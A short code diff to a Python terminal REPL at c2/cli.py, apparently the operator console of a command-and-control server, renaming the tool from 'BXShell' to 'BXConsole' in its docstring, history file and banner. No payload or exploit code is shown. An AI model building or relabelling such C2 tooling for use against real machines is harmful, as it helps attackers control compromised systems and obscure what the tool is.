@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""BXShell 운영자 CLI v0.2 — 터미널 REPL.
+"""BXConsole 운영자 CLI v0.2 — 터미널 REPL.
 
 실행:  python3 c2/cli.py [C2_URL]
        python3 c2/cli.py http://127.0.0.1:7700
@@ -26,7 +26,7 @@ WAIT_SECS = 15          # 명령 결과 최대 대기
 # ── readline (있으면) ──
 try:
     import readline
-    HIST_FILE = os.path.expanduser("~/.bxshell_history")
+    HIST_FILE = os.path.expanduser("~/.bxconsole_history")
     try: readline.read_history_file(HIST_FILE)
     except FileNotFoundError: pass
     import atexit; atexit.register(readline.write_history_file, HIST_FILE)
@@ -105,7 +105,7 @@ def send(active, code, quiet=False):
 
 # ── 메인 REPL ──
 def main():
-    print(f"\033[94mBXShell CLI v0.2  →  {C2}\033[0m")
+    print(f"\033[94mBXConsole CLI v0.2  →  {C2}\033[0m")
     print("  도움: ?  |  목록: ls  |  종료: q\n")
 
     active      = None
